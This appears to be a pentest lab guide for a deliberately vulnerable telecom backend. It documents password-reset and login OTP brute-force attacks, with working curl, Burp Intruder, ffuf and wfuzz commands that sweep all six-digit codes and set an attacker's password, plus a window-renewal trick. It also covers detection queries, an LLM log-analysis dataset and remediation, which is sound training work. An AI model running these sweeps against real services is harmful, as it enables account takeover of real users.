# M3 — Insecure Authentication/Authorization · VulnMNO Pentest Guide

This guide documents **pre-existing M3 weaknesses** in the VulnMNO backend that
the Android client drives. As with the [M1 guide](M1-Improper-Credential-Usage.md),
no new code is introduced for these labs — the weaknesses already ship in the
codebase and are catalogued here so trainees can practise locating, exploiting
and remediating them.

> **Reconstruction note.** The file shipped in the initial commit was a corrupt
> one-liner (`*** End Patch`). This document was rebuilt from the live source
> (`app/routers/auth.py`, `app/services/auth.py`, `app/schemas/auth.py`,
> `app/models/auth_tokens.py`), so every endpoint, field name and status code
> below was read off the running code, not recovered from the lost original.

> **Scope.** The backend is the target. The mobile app is just one client of it;
> every attack here is a direct HTTP attack on `/api/auth/*` and needs no device.

OWASP MASVS reference: **M3 — Insecure Authentication/Authorization.** Three labs:

| Lab | Subcategory                                   | Severity | Difficulty |
|-----|-----------------------------------------------|----------|------------|
| L1  | Login-OTP brute-force (no attempts cap)       | High     | Medium     |
| L2  | **"Forgot password?" OTP brute-force → takeover** | Critical | Easy/Medium |
| L3  | No certificate pinning (user-CA MITM)         | High     | Easy       |

**L2 is the centerpiece** and is documented in full (manual walk-through + Burp
Suite + ffuf/wfuzz). L1 and L3 are summarised and cross-referenced.

---

## L1 — Login-OTP code brute-force (no attempts cap)

### Where it lives

- **Endpoint:** `POST /api/auth/otp/verify`  ·  body `{"challengeToken","code"}`
- **Code:** `app/services/auth.py::verify_otp`
- **Model:** `app/models/auth_tokens.py::OtpChallenge` (has an `attempts` column)

### Why it is M3

Some logins return an `OtpChallenge` (`{"challengeToken","expiresIn"}`) instead
of a token pair; the client must POST a 6-digit `code` to `/api/auth/otp/verify`.
The code is validated `^[0-9]{6}$` and lives for `otp_ttl_seconds = 300`. The
service still **counts** failures (`challenge.attempts += 1`) but the comment in
`verify_otp` is explicit that the enforcement was removed for the lab:

> *the attempts cap that previously consumed the challenge once
> `challenge.attempts >= settings.otp_max_attempts` was hit has been removed
> deliberately … the server no longer [stops you].*

So a wrong code returns `401 {"error":{"code":"OTP_INVALID"}}` forever; a right
code returns a `TokenPair`. 10⁶ candidates over a 5-minute window → brute-forceable.
Unlike L2 below, this flow *does* leave a DB trail: `OtpChallenge.attempts` climbs,
so a blue-teamer could alert on it (the lab records the signal but does not act on
it). The exploitation mechanics are identical to L2 — point the technique at
`/api/auth/otp/verify`, marking `code` as the payload and keeping `challengeToken`
fixed, matching on a `200` (token pair) instead of `204`.

---

## L2 — "Forgot password?" OTP brute-force → account takeover

This is the app's **"Forgot password?"** journey (docs §9, password-reset flow).
In production the reset code is a random one-time value emailed/SMS'd to the
account owner; an attacker who only knows a victim's phone number should *not* be
able to complete the reset. Here they can, because the verify step has **no rate
limit and no attempts cap**.

### Where it lives

- **Request a code:** `POST /api/auth/password-reset/request` · body `{"msisdn"}` · always `204`
- **Submit code + new password:** `POST /api/auth/password-reset/confirm` · body `{"msisdn","code","newPassword"}`
- **Code:** `app/services/auth.py::request_password_reset` / `confirm_password_reset`
- **Schema:** `app/schemas/auth.py::PasswordResetConfirm`
  (`msisdn ^\+[0-9]{8,15}$`, `code ^[0-9]{6}$`, `newPassword` 8–128 chars)
- **Model:** `app/models/auth_tokens.py::PasswordReset` — **note it has no `attempts` column**

### Why it is M3

Compare the two relevant routes in `app/routers/auth.py`:

```python
@router.post("/login", response_model=Union[TokenPair, OtpChallenge])
@limiter.limit("5/minute")                 # <-- login IS throttled
async def login(...):

@router.post("/password-reset/confirm", status_code=204)
async def password_reset_confirm(...):     # <-- NO @limiter, NO attempts cap
```

`confirm_password_reset` looks up the newest un-consumed `PasswordReset` row for
the customer and compares hashes:

```python
if row is None or to_aware(row.expires_at) < now() or sha256_hex(code) != row.code_hash:
    raise AppError(ErrorCode.OTP_INVALID, "Reset failed", http_status=401)
row.consumed_at = now()
customer.password_hash = hash_password(new_password)
await _revoke_chain(session, customer.id, reason="password_reset")
```

Four failures stack:

1. **No per-route rate limit.** `/login` carries `@limiter.limit("5/minute")`; the
   two `password-reset/*` routes carry none. The `Limiter` has no `default_limits`,
   so nothing throttles them globally either.
2. **No attempts cap.** `PasswordReset` has no `attempts` field; a wrong `code`
   neither increments a counter nor consumes the row. The same row stays valid for
   the whole `password_reset_ttl_seconds = 900` (15 min) across unlimited guesses.
3. **A clean oracle.** Wrong → `401 {"error":{"code":"OTP_INVALID","message":"Reset failed"}}`.
   Right → `204` with an empty body. A perfect binary signal to match on.
4. **The hit *is* the takeover.** The same request that carries the right `code`
   also carries `newPassword`, so landing the code sets the password in one shot.

### Make the code genuinely unknown (lab setup — do this first)

The lab default issues the fixed code `123456` (`settings.password_reset_fixed_code`,
or a per-customer `Customer.otp_fixed_code`) so the normal §9 journey works without
log-scraping. **With a fixed code there is nothing to brute-force** — you'd just
submit `123456`. To make the exercise real, force a random code and don't read it:

```bash
# in src/docker/docker-compose.yml, backend service env:
#   VULNMNO_PASSWORD_RESET_FIXED_CODE: ""
# then rebuild the backend so the setting takes effect:
cd src/docker && docker compose --profile tls up -d --build backend
```

Now `request_password_reset` issues `f"{secrets.randbelow(10**6):06d}"` — a random
6-digit code. (It is still logged server-side as `PWRESET issued msisdn=… code=…`;
**don't** `grep` it — that defeats the lab. The log line is there so the blue-team
side can later prove what was issued.)

### The signal: 204 vs 401

Everything below keys off one fact — only the response **status** (and body length)
distinguishes a hit from a miss:

| Outcome | Status | Body |
|---|---|---|
| Wrong / expired / no code | `401` | `{"error":{"code":"OTP_INVALID","message":"Reset failed"}}` (~55 B) |
| **Correct code** | `204` | *empty* (0 B) |
| Malformed code (not 6 digits) | `400` | `{"error":{"code":"VALIDATION_FAILED",…}}` |

That last row is why every tool below uses a **zero-padded** wordlist: an unpadded
`42` is rejected as `400` by the `^[0-9]{6}$` validator before the code is ever
checked, which would pollute your filter. Match strictly on `204`.

### Feasibility (read before you start)

10⁶ codes inside a 900 s window ≈ **~1,100 req/s** to sweep the whole space once.
Against the local backend `ffuf -t 200` gets there; **Burp Community's throttled
Intruder does not**. Practical split:

- **Burp** → *understand* the attack and confirm the 204/401 oracle on a handful of codes.
- **ffuf / wfuzz** → *actually land* it at high concurrency.
- If you must go slow, **renew the window**: re-POST `/password-reset/request` for
  the same msisdn. Each call mints a fresh `PasswordReset` row and resets the 15-min
  TTL, so a slower sweep can outlast a single window indefinitely (see *Extending
  the window* below).

### Exploitation walk-through (manual, curl)

`<host>` = lab host. Direct `:8000` (cleartext) is easiest for high-rate work;
HTTPS via Caddy (`https://<host>`, add `-k`) works identically.

```bash
# 0) (lab) force a random, unknown code — see "Make the code genuinely unknown".

# 1) Trigger a reset. Always 204, even for an unknown msisdn (no user enumeration).
curl -i -X POST http://<host>:8000/api/auth/password-reset/request \
  -H 'Content-Type: application/json' \
  -d '{"msisdn":"+34600000001"}'
# HTTP/1.1 204 No Content

# 2) Brute-force the code (ffuf/Burp below). The winning request carries the
#    attacker's newPassword, so the 204 hit changes the password in one shot.
#    Suppose the hit is code 042137:
curl -i -X POST http://<host>:8000/api/auth/password-reset/confirm \
  -H 'Content-Type: application/json' \
  -d '{"msisdn":"+34600000001","code":"042137","newPassword":"Pwned123!"}'
# HTTP/1.1 204 No Content   <-- password is now "Pwned123!"

# 3) Log in as the victim. (Login is 5/min-limited, but one request is fine.)
curl -i -X POST http://<host>:8000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"msisdn":"+34600000001","password":"Pwned123!"}'
# 200 OK + {"accessToken":"…","refreshToken":"…"}   <-- account takeover
```

Side effect to expect: a successful confirm calls `_revoke_chain(reason="password_reset")`,
revoking the victim's refresh tokens — their app is logged out on the next refresh.
The takeover is not silent to the victim, only to the server's defences.

### Brute force with Burp Suite (Intruder)

> **Prerequisite — issue the reset FIRST (the #1 reason this "fails").** `/confirm`
> validates `code` against a *pending* `PasswordReset` row, which only exists after
> `POST /api/auth/password-reset/request {"msisdn":"…"}` (→ 204). With no pending
> row, **every** code returns `401 "OTP code is invalid or expired."` — including
> the correct one — because there is nothing to match against. The row also expires
> in 15 min and is consumed on the first success, so fire a fresh `/request` (Burp
> Repeater or `curl`) *immediately before* each Intruder run. Sequence: `request`
> → Intruder on `confirm`.

![[m3_password_change_request.png]]

API shows information about how the OTP must be with "msg" hint "String should match pattern" indicating that it must be a 6 figures decimal number.
![[m3_password_change_attempt.png]]

1. Proxy the *single* confirm request once (any code), then **right-click →
   Send to Intruder**.
2. **Positions** tab → **Sniper** attack. Clear auto-marks, then highlight only the
   `code` value inside the JSON body and click **Add §**. Leave `msisdn` and
   `newPassword` static — the static `newPassword` is what the winning request sets.

![[m3_sniper_attack_password_changed.png]]
   
   ```
   POST /api/auth/password-reset/confirm HTTP/1.1
   Host: <host>:8000
   Content-Type: application/json

   {"msisdn":"+34600000001","code":"§000000§","newPassword":"Pwned123!"}
   ```
3. **Payloads** tab → type **Numbers**, From `0`, To `999999`, Step `1`, Number
   format **Min/Max integer digits = 6** (this zero-pads `42` → `000042`, so you
   never trip the `400` validator). Or use **Runtime file** with the `seq -w`
   wordlist from the ffuf section.
4. **Start attack.** Sort results by **Status code** — the single `204` (length 0)
   is the code; everything else is `401`. (Add a **Settings → Grep – Extract** or
   just sort the Length column if you prefer.)
5. **Reality check:** Community edition throttles Intruder to a crawl, so a full
   10⁶ sweep is impractical here — use Burp to *prove the oracle* on a small range,
   then switch to ffuf to land it. Pair with window renewal if needed.

![[m3_sniper_attack_logs.png]]
### Brute force with fuzzers (ffuf / wfuzz)

Build a **zero-padded** wordlist once (`seq -w` pads to the width of the max value):

```bash
seq -w 0 999999 > codes.txt   # 000000 … 999999, one per line
```

**ffuf** — POST JSON, `FUZZ` in the `code` field, match strictly on `204`:

```bash
ffuf -w codes.txt:FUZZ \
  -u http://<host>:8000/api/auth/password-reset/confirm \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"msisdn":"+34600000001","code":"FUZZ","newPassword":"Pwned123!"}' \
  -mc 204 \
  -t 200 -s
```

- `-mc 204` overrides ffuf's default matcher (which would otherwise show the `401`s
  too) — only the takeover hit is printed.
- `-t 200` concurrency; tune down if the backend sheds load. Stop on the first hit:
  once a `204` lands, the row is consumed and the password is already changed.
- Only `code` varies; `newPassword` is identical on every request, so the winning
  request is the password change.

**wfuzz** — same wordlist (don't use `-z range`, it won't zero-pad), show only `204`:

```bash
wfuzz -z file,codes.txt \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"msisdn":"+34600000001","code":"FUZZ","newPassword":"Pwned123!"}' \
  --sc 204 \
  http://<host>:8000/api/auth/password-reset/confirm
```

- `--sc 204` shows only success; add `--hc 400,401` to silence the noise explicitly.

### Extending the window (`/request` auto-renewal)

A single code lives 900 s. If your sweep is slower than that, interleave a fresh
`POST /api/auth/password-reset/request` for the same msisdn every ~10 min: it mints
a new `PasswordReset` row and `confirm` always matches against the **newest**
un-consumed row, so the new code's 15-min clock effectively never runs out. This
turns a rate-limited or low-thread attack from "impossible in one window" into
"eventually certain" — and it leaves a second, louder signal in the access log
(repeated `request` calls for one msisdn) that the detection section uses.

---

## L3 — No certificate pinning / user-CA trust (MITM)

- **File:** `app/src/main/res/xml/network_security_config.xml` (and the debug overlay).
- Both the debug **and** release `network-security-config` trust
  `<certificates src="user" />` and the app uses **no `CertificatePinner`**. Any CA
  the user can be coaxed into importing (e.g. a Burp/mitmproxy root) is trusted by
  the app, so HTTPS is interceptable on Android 7+ without root.
- This is the dynamic complement to the brute-force labs: with a MITM position you
  read the `password-reset/confirm` request straight off the wire (the new password
  is in the body in clear once TLS is stripped), no guessing required.
- **The full MITM walk-through is in [M1 L3](M1-Improper-Credential-Usage.md#l3--cleartext-http-permitted-globally-debug-variant)**
  and the operational Burp/`nip.io` setup is in [src/README.md](../../../README.md)
  → *"Intercept the app with Burp (MITM)"*. Not duplicated here.

---

## Detection (blue-team) — the access log is the only witness

This section is the premise of the log-analysis exercise: a brute-force buried in
a large volume of benign traffic, which an analyst (or an LLM) must surface.

**Why the database is blind.** `confirm_password_reset` writes **no** `audit_events`
row, and `PasswordReset` has **no `attempts` column** — so the brute-force leaves
*zero* trace in the DB. (Contrast L1: the login-OTP flow at least increments
`OtpChallenge.attempts`.) The **only** record of the attack is the HTTP access log —
uvicorn's, and Caddy's if the traffic went over HTTPS.

**The needle.** For one `msisdn` / source IP, within a ~15-minute window:

```
… many …  POST /api/auth/password-reset/confirm  → 401     (the guesses)
 (maybe)  POST /api/auth/password-reset/request   → 204 ×N  (window renewal)
 exactly  POST /api/auth/password-reset/confirm   → 204     (the hit)
 shortly  POST /api/auth/login                    → 200     (the takeover)
```

The trailing `login` **does** write a `LOGIN_SUCCESS` audit row, so the DB
corroborates the *outcome* even though it missed the *attack* — a useful pivot to
teach (correlate the access-log burst with the lone audit event).

Quick triage over a uvicorn access log:

```bash
# 401 bursts on the confirm endpoint, by source — the brute-force fingerprint
grep 'POST /api/auth/password-reset/confirm' access.log \
  | awk '$NF==401 {print $1}' | sort | uniq -c | sort -rn | head

# the moment of compromise: a 204 on confirm, then a 200 login soon after
grep -E 'POST /api/auth/password-reset/confirm.*204|POST /api/auth/login.*200' access.log
```

This is exactly the kind of high-volume, low-signal haystack used to test whether
an LLM can pick out the malicious cluster.

### Generating a log dataset

`src/scripts/simulate_traffic.py` builds one: it drives the real API with many
concurrent benign sessions (logins, §9 reads, support tickets, **and legitimate
password-reset flows** so `/password-reset/confirm` is *not* unique to the attack)
and embeds the brute-force from one forged source IP. Each simulated user gets a
distinct `X-Forwarded-For`, which the backend logs as the client IP because it runs
with `--proxy-headers --forwarded-allow-ips=*` — so the dataset has per-user
sources and the attacker stands out by *rate and concentration*, not by endpoint
alone (a one-line grep won't separate it).

```bash
# 1) generate the traffic (hit :8000 directly so the forged XFF is logged)
python3 src/scripts/simulate_traffic.py --benign-sessions 120 --attack-attempts 800
#    --land  also completes the takeover (204 -> login 200); restore the pw after.

# 2) capture the backend log WITH timestamps (needed for the rate signal)
docker logs -t docker-backend-1 > traffic.log 2>&1     # 2>&1 grabs both streams

# 3) feed traffic.log to the LLM; grade its answer against traffic-groundtruth.json
#    (attacker IP, victim msisdn, time window — written by the script).
```

The OTP values and victim msisdn never appear per-line (bodies aren't logged, as
above); the ground-truth file carries them so you can score what the LLM found.

## Remediation (the "after" picture)

1. **Throttle the verify steps.** Add `@limiter.limit("5/minute")` (keyed by IP and
   by `msisdn`) to `/password-reset/confirm`, `/password-reset/request` and
   `/otp/verify` — matching what `/login` already has.
2. **Cap and consume attempts.** Re-introduce the removed cap: give `PasswordReset`
   an `attempts` column, increment on each miss, and invalidate the row once it
   crosses `otp_max_attempts`. Do the same for `OtpChallenge` (enforce, don't just
   count).
3. **Don't let `/request` renew indefinitely.** Limit reset issuance per account and
   invalidate prior un-consumed rows on re-issue.
4. **Emit an audit event on every confirm attempt** (success and failure) so the DB
   is no longer blind and detection doesn't depend solely on access logs.
5. **Constant-time compare** of the code hash, and a generic response with backoff;
   optionally lock the account and notify the owner after repeated failures.

---

## Suggested lab flow for trainees

1. **Recon.** Browse `http://<host>:8000/docs`; note `/password-reset/confirm` has no
   throttling and the schema (`msisdn`, `code`, `newPassword`). Read `verify_otp` /
   `confirm_password_reset` to confirm the missing cap.
2. **Arm the lab.** Set `VULNMNO_PASSWORD_RESET_FIXED_CODE=""`, rebuild backend, so the
   code is random and genuinely unknown.
3. **Understand (Burp).** Request a reset, send one confirm to Intruder, prove the
   `204`-vs-`401` oracle on a small numeric range.
4. **Land it (ffuf).** Sweep `seq -w 0 999999` with `-mc 204`, take the password over,
   log in as the victim. Use `/request` renewal if your sweep outlasts the window.
5. **Switch to blue team.** Generate/inspect the access log, write the detection
   query above, then the remediation diff (rate limit + attempts cap + audit on
   confirm). Re-run step 4 against the patched backend and confirm the throttle and
   the cap now stop the attack.
